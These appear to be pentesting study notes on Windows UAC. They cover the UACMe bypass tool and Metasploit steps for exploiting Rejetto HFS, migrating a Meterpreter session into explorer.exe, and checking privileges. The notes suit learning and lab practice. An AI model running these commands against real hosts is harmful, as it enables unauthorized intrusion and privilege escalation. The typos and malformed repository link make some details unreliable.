# User Account Control
* A security feature introduced in Windows Vista used to prevent unauthorized chnages from being made to the operating system.
* UAC ensures that changes to the OS require approval from the administratoror a user that is part of the local administrator'group.
* If non-privileged user ---> Prompted with UAC credential prompt.
* If privileged user ---> prompted with a consent prompt ususally saying: "Do you want to allow this app to make changes to your device".
* Attacks can bypass UAC to execute malicious executables with elevated priviliges.


# Tools 
* **UACMe**
    * An open source privilege escalation tool developed by @hfire0x
    * `https:github.com/hfire0x/UACME`
    * The UACMe github repository has more than 60 exploits that can be used to bypass UAC depending on the version of Windows running on the target.
 
* **rejetto**
   * `use exploit/windows/http/rejetto_hfs_exec`
   * `set rhosts [IP]` --> `exploit`
   * Inside the meterpreter session, check if the current session is 32-bit or 64-bit with this command: `sysinfo`
   * 32-bit --> x86/windows
   * 64-bit --> x64/windows
   * If we need to change the session from x86 to x64 :---> check the id of explorer.exe ---> `pgrep explorer` ---> `migrate [ID fetched from pgrep]`
   * To know the username ---> `getuid`   ---> ([usernmae]/admin ---> here admin is not administrator. It has limited privileges)
   * To know your privileges --> `getprivs`
